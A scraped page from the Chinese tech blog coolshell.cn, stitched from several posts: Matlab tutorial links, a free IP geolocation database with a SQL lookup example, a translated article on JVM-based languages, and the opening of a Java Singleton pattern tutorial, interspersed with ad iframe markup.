w=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=8807&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31073764%2C44782468%2C44788442%2C44789923&amp;oid=2&amp;psts=ABHeCviHYgOwj1kQnfNpHfcc8wlmJan6r5SZlpSyLuzzqQ3gPpNZj_H_c40gvUbt1VXRnYoLk73iK-8Ds7SPdWc0x-qS%2CABHeCvijin2T3q2Iv7m9vTHxcCWaqv4hJvzHb93sKV3MsJLvxPk5DtIFsjWNu-QeyoWWHEi7mEArfKbNEl8aBBFSiECtDg%2CABHeCvh99NZ0ECz5334yCyBvwjXmot9oLZA3DdIbC1KnhSnO73DRBFazfV5KVRyZImKB4WCf4FvmfNWMRGaB5KrmkZL6GA%2CABHeCvjp89V9ThQ7dmk7dkBryiF9xzIKo9qncqo510VkU6NDf9Cn2EtWTLksNxBXq-ZCGpz75rBRPEh6fetOvjFLbtlkpw%2CABHeCvhnm2gT_zIBGgkc1eyWOEF7kz_2-LXZiuFUpF_gnBs2fYWzuyhg33i8uZIEO_G7T8TUth5omWbIHwFkTbxzS_0x_Q%2CABHeCvjKXyMeD7cDFTZRjsZQ1hK1vIC9kAZbiRCAwRy2YLSRsiOxq9-AeyZ_lDYmIUl67hvhTogJe1LzDIPk9wJWqgxITw%2CABHeCvi9dJU9kzGBOgmqmocKYNsen4wJxpV79MfCPnYCkBlvxFlLhXXjrOV_z_L44uvnvOY775vzXRaRq3lyQ4fDMorFmw&amp;pvsid=1928529129288586&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=9&amp;uci=a!9&amp;btvi=8&amp;fsb=1&amp;xpc=6eLMTVqrA0&amp;p=https%3A//coolshell.cn&amp;dtd=11981" data-google-container-id="a!9" data-google-query-id="CNCK2NH99v4CFVq_lgodAbsJPQ" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

**Matlab**
[Matlab Basics Tutorial](http://www.engin.umich.edu/group/ctm/basic/basic.html)
[Matlab Summary and Tutorial](http://www.math.ufl.edu/help/matlab-tutorial/)
[Matlab – Official Online Manuals in PDF](http://www.mathworks.com/access/helpdesk/help/fulldocset.shtml)

**Misc**
[The Soar 8 Tutorial Home Page](http://bigfoot.eecs.umich.edu/~soar/tutorial.html)

# 全球IP地址数据库

下面是一个免费的全球IP地址数据库，包括了国家，城市，地区，和经纬度，以便你可以利用Google Map在地图上标注。这个数据库的精确度可能有60%左右。

[**SQL format**](http://www.blogama.org/ipinfodb.sql.bz2)
更新至 2009年3月11日

[**CSV format**](http://www.blogama.org/ipinfodb_csv.zip) (多文件)
更新至 2009年3月11日

下面是怎么使用这个数据库。



首先，所有的IP地址都是按一个整形来存放的，假设一个IP地址为A.B.C.D，那么其计算公式如下所示：

ip = (A*256+B)*256+C

也就是说，它只计算到网段为：A.B.C.0到A.B.C.255。例如：我们有一个IP地址为：74.125.45.100 (google.com)，那么，

ip = (74*256+125)*256+45 = 4881709

这样，我们可以方便地使用如下的SQL语句搜索数据：

SELECT * FROM 

ip_group_city

WHERE

ip_start

 <= 4881709 ORDER BY ip_start DESC LIMIT 1;



结果会是如下所示：

ip_start|country_code|region_code|city|zipcode|latitude|longitude
4881664|US|CA|Mountain View|94043|37.4192|-122.057

如果你想在线使用这些数据的话，你可以使用如下所示的网址：

http://blogama.org/ip_query.php?ip=74.125.45.100&output=xml

于是，你就会得到如下的XML数据：

<?xml version=“1.0” encoding=“UTF-8”?><Response><Ip>74.125.45.100</Ip><Status>OK</Status><CountryCode>US</CountryCode><CountryName>United States</CountryName><RegionCode>CA</RegionCode> <RegionName></RegionName><City>Mountain View</City><ZipPostalCode>94043</ZipPostalCode><Latitude>37.4192</Latitude><Longitude>-122.057</Longitude></Response>

如果你请求的是：

http://blogama.org/ip_query.php?ip=74.125.45.100&output=raw

这样你会得到CSV的格式：

74.125.45.100,OK,US,United States,CA,,Mountain View,94043,37.4192,-122.057

文章：[来源](http://blogama.org/node/58)

# 基于JVM的语言正在开始流行

**总结：**

这是 [Reuven Lerner](https://coolshell.cn/member/reuven)在去年写的一篇博文，文章主要介绍了一些新兴的基于JVM的脚本语言。结合本文可以对Bruce的博文《[C++和JAVA传统中积极的一面](https://coolshell.cn/articles/209.html)》有一个很好的理解。译者认为：语言始终都是一门工具，软件设计最重要的东西是来自于设计者的创造性，但是随着Java语言的出现，他的半动态的特性，ClassLoader，反射，动态代理，都是提高开发者创造性的前提，正是因为这些特性，才会出现新的的编程模式和范式——反转控制和依赖注入，面向方面的编程(AOP)。试想如果Java不提供ClassLoader，反射，动态代理机制的API，如何能实现依赖查找和依赖注入和动态AOP? 你能用C++来反转控制，依赖查找吗，能对容器中的组件做进行生命周期管理吗？为了说明程序员创造性和语言的这个关系，我引用[Dion Hinchcliffe](http://hinchcliffe.org/)博文中的一张图来说明：

 ![程序员创造性和性能的关系](photo/weblanguagecomparison1.png)

原文：http://ostatic.com/blog/jvm-based-languages-grow-in-popularity
**基于JVM的语言正在开始流行**

当Sun Microsystems公司在1995年第一次揭开Java的面纱的时候，就是非常难被定义的。这是因为JAVA是由多个部分构成：首先，它当然是一个面向对象语言。同时JAVA也是一个定义标准的语言(或多个标准，包括移动设备，标准，和企业三个版本)。最后，Java是一个虚拟机(“JVM”)，一个Java程序能够执行的软件环境。如果你有一个JVM，虽然这个JVM只能用来运行Java的程序——但是，JVM能在运行在你能想到的每一个平台之上，这使得Java成为一个具有高移植性的语言。

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=505494360&amp;adf=2191187644&amp;pi=t.aa~a.425447425~i.9~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141987&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F247.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bh73dWBj5hLjjFAc6KbVVGK_1UKQ6TfA-LZQxeKP4oU3ijAYNb8hJFlC_T-AjpFF0lCDacf&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141990127&amp;bpp=1&amp;bdt=1665&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280&amp;nras=3&amp;correlator=4676015844130&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2111988322&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1759&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31074601%2C44788442%2C44790154&amp;oid=2&amp;pvsid=422842816503541&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=WFIb4hsbyE&amp;p=https%3A//coolshell.cn&amp;dtd=27" data-google-container-id="a!3" data-google-query-id="CM-iwej99v4CFcWzlgodWFgEOg" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>



在Java世界的一个令人着迷的趋势就是：在最近的几年里使用JVM来运行非Java的程序在程增长的趋势。毕竟，如果创造了一门新的语言，你就必须在特定的平台上实现它。如果你想你的语言能在不同的平台上移植，那么你就需要为每一个平台实现一个版本。但是，相比而言，如果你将语言实现在JVM上，那么你就能让你的语言运行在任何系统的JVM上，这就意味着几乎所有平台都可以运行。

于是现在就有了许多的基于JVM的新增语言。其中4个最流行的是发布在开源许可证之下的。考虑到如今Java也是开发源码了，这意味着你可以使用一个全开源体系，并且这个体系是可以移植的。因为这些语言都在JVM之上实现的，所以你就可以同时访问Java的标准库。这意味着如果有一个第三方的的Java库，而且你精于Python，那么你就可以使用Jython在你的源代码中访问这些Java库。

<iframe id="aswift_3" name="aswift_3" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=505494360&amp;adf=999500603&amp;pi=t.aa~a.425447425~i.15~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141987&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F247.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bh73dWBj5hLjjFAc6KbVVGK_1UKQ6TfA-LZQxeKP4oU3ijAYNb8hJFlC_T-AjpFF0lCDacf&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141990127&amp;bpp=1&amp;bdt=1665&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280&amp;nras=4&amp;correlator=4676015844130&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2111988322&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=2399&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31074601%2C44788442%2C44790154&amp;oid=2&amp;pvsid=422842816503541&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=4&amp;uci=a!4&amp;btvi=2&amp;fsb=1&amp;xpc=qR5h7IwKde&amp;p=https%3A//coolshell.cn&amp;dtd=49" data-google-container-id="a!4" data-google-query-id="CI3Uwuj99v4CFU-0lgodSu4POg" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

早期的基于JVM的脚本语言，就我所知，是Jython,之前被称为JPython。Jython，从名字你就可以猜到，是一个基于JVM的Python语言实现。Jython完全兼容Python2.2的标准版本(这个标准版本的Python也被称为CPython)，这意味着Jython将会没有Python的一些新特性。最近发布的Jython版本是2007年月发布的，但是Sun雇佣了两位早期Jython非常知名的开发者，并且现在Jython可以运行Django应用程序框架，因此验证其兼容Python的能力

Sun公司同时资助了JRuby的开发，一个基于JVM的Ruby版本。Jython是Python唯一的两个实现的其中之一，对比而言，JRuby则是众多Ruby语言实现的其中之一。然而,JRuby被广泛的认为是一个非常重要的版本。特别是因为他的效率，和高度兼容标准C的Ruby版本实现。JRuby同样可以运行Ruby on Rails框架(**译者注：构建在Ruby之上的WEB应用框架**)，此外还能运行其他众多的功能。

<iframe id="aswift_4" name="aswift_4" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=505494360&amp;adf=97165707&amp;pi=t.aa~a.425447425~i.19~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141987&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F247.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bh73dWBj5hLjjFAc6KbVVGK_1UKQ6TfA-LZQxeKP4oU3ijAYNb8hJFlC_T-AjpFF0lCDacf&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141990127&amp;bpp=1&amp;bdt=1666&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280%2C704x280&amp;nras=5&amp;correlator=4676015844130&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2111988322&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=3039&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31074601%2C44788442%2C44790154&amp;oid=2&amp;pvsid=422842816503541&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=5&amp;uci=a!5&amp;btvi=3&amp;fsb=1&amp;xpc=HKWQccDUlj&amp;p=https%3A//coolshell.cn&amp;dtd=52" data-google-container-id="a!5" data-google-query-id="CODJwuj99v4CFQqblgodOEMELg" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

Jython和JRuby都是从其他已存在的语言中移植到JVM中来的。而全新的基于JVM的脚本语言是Groovy和Scala。这两门语言现在都越来越流行，不同的是，Groovy是动态脚本语言，而是Scala是静态语言。使用Groovy最著名的应用是Groovy on Grails项目，一个用Groovy写成，运行在JVM之上的WEB应用框架(和Ruby on Rails很相似)。Grails找到通向商业应用程序的道路，最著名的就是LinkedIn,使用Linkedin，开发人员发现他们能比直接使用Java更快速和容易的开发程序。相比而言，Scala，而是强类型是语言，Steve Yegge最近的一次访谈中曾经谈到、静态语言和动态语言的争论，因为这个他还受到了很多的批评（**译者注：关于Steve Yegge的这篇关于动态语言和静态语言之争可以查看**[**这里**](https://steve-yegge.blogspot.com/2008/05/dynamic-languages-strike-back.html),**Steve Yegge是一个动态语言的支持者**）
Java已经被公认为是非常成功而流行的语言。现在，Java也同时也被认为是非常流行的平台，这四类语言仅仅是在不远的将来通过JVM来实现的新兴语言的开始

# 深入浅出单实例SINGLETON设计模式

单实例Singleton设计模式可能是被讨论和使用的最广泛的一个设计模式了，这可能也是面试中问得最多的一个设计模式了。这个设计模式主要目的是想在整个系统中只能出现一个类的实例。这样做当然是有必然的，比如你的软件的全局配置信息，或者是一个Factory，或是一个主控类，等等。你希望这个类在整个系统中只能出现一个实例。当然，作为一个技术负责人的你，你当然有权利通过使用非技术的手段来达到你的目的。比如：你在团队内部明文规定，“XX类只能有一个全局实例，如果某人使用两次以上，那么该人将被处于2000元的罚款！”（呵呵），你当然有权这么做。但是如果你的设计的是东西是一个类库，或是一个需要提供给用户使用的API，恐怕你的这项规定将会失效。因为，你无权要求别人会那么做。所以，这就是为什么，我们希望通过使用技术的手段来达成这样一个目的的原因。

本文会带着你深入整个Singleton的世界，当然，我会放弃使用C++语言而改用Java语言，因为使用Java这个语言可能更容易让我说明一些事情。

####  **Singleton的教学版本**

这里，我将直接给出一个Singleton的简单实现，因为我相信你已经有这方面的一些基础了。我们姑且把这个版本叫做1.0版

// version 1.0

**public** **class** Singleton {

​    **private** **static** Singleton singleton = **null**;

​    **private** Singleton() {  }

​    **public** **static** Singleton getInstance() {

​        **if** (singleton== **null**) {

​            singleton= new Singleton();

​        }

​        **return** singleton;

​    }

}

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=3483825635&amp;pi=t.aa~a.425447425~i.9~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022335&amp;bpp=6&amp;bdt=5007&amp;idt=6&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764&amp;nras=4&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1602&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=gG4xyBbTR8&amp;p=https%3A//coolshell.cn&amp;dtd=222" data-google-container-id="a!3" data-google-query-id="CNXL-_f99v4CFQweKgodlb8ArQ" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

<iframe id="aswift_5" name="aswift_5" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1086968807&amp;adf=3349300811&amp;pi=t.aa~a.425447425~i.10~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135591&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F265.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bj18QhN8A-FpXxGrDEhaszwEgLT6rxWGtPqoV4nx4u20Yac6fUemhMw_NiRnudTBnJEG1_M&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142022370&amp;bpp=1&amp;bdt=5042&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C704x280&amp;nras=5&amp;correlator=1295508954388&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=26642487&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1882&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788441%2C44792089&amp;oid=2&amp;psts=ABHeCvgx6APPkg0cJcI-3IR0CRFy-kpkOgrOHoCOSqwtPBl1UKZYuRhOLa0onR4ipxQoeyTUA9r748brn5TzyHrXsc_mbKk&amp;pvsid=1139274973973122&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;cms=2&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=6&amp;uci=a!6&amp;btvi=2&amp;fsb=1&amp;xpc=Q8lMPiHGSB&amp;p=https%3A//coolshell.cn&amp;dtd=284" data-google-container-id="a!6" data-google-query-id="CJ7JgPj99v4CFUkyKgodJpUB7g" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

在上面的实例中，我想说明下面几个Singleton的特点：（下面这些东西可能是尽人皆知的，没有什么新鲜的）

1. 私有（private）的构造函数，表明这个类是不可能形成实例了。这主要是怕这个类会有多个实例。
2. 即然这个类是不可能形成实例，那么，我们需要一个静态的方式让其形成实例：getInstance()。注意这个方法是在new自己，因为其可以访问私有的构造函数，所以他是可以保证实例被创建出来的。
3. 在getInstance()中，先做判断是否已形成实例，如果已形成则直接返回，否则创建实例。
4. 所形成的实例保存在自己类中的私有成员中。
5. 我们取实例时，只需要使用Singleton.getInstance()就行了。

当然，如果你觉得知道了上面这些事情后就学成了，那得给你当头棒喝一下了，事情远远没有那么简单。

#### **Singleton的实际版本**

上面的这个程序存在比较严重的问题，因为是全局性的实例，所以，在多线程情况下，所有的全局共享的东西都会变得非常的危险，这个也一样，在多线程情况下，如果多个线程同时调用getInstance()的话，那么，可能会有多个进程同时通过 (singleton== null)的条件检查，于是，多个实例就创建出来，并且很可能造成内存泄露问题。嗯，熟悉多线程的你一定会说——“我们需要线程互斥或同步”，没错，我们需要这个事情，于是我们的Singleton升级成1.1版，如下所示：

// version 1.1

**public** **class** Singleton

{

​    **private** **static** Singleton singleton = **null**;

​    **private** Singleton() {  }

​    **public** **static** Singleton getInstance() {

​        **if** (singleton== **null**) {

​            **synchronized** (Singleton.class) {

​                singleton= new Singleton();

​            }

​        }

​        **return** singleton;

​    }

}

<iframe id="aswift_6" name="aswift_6" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" 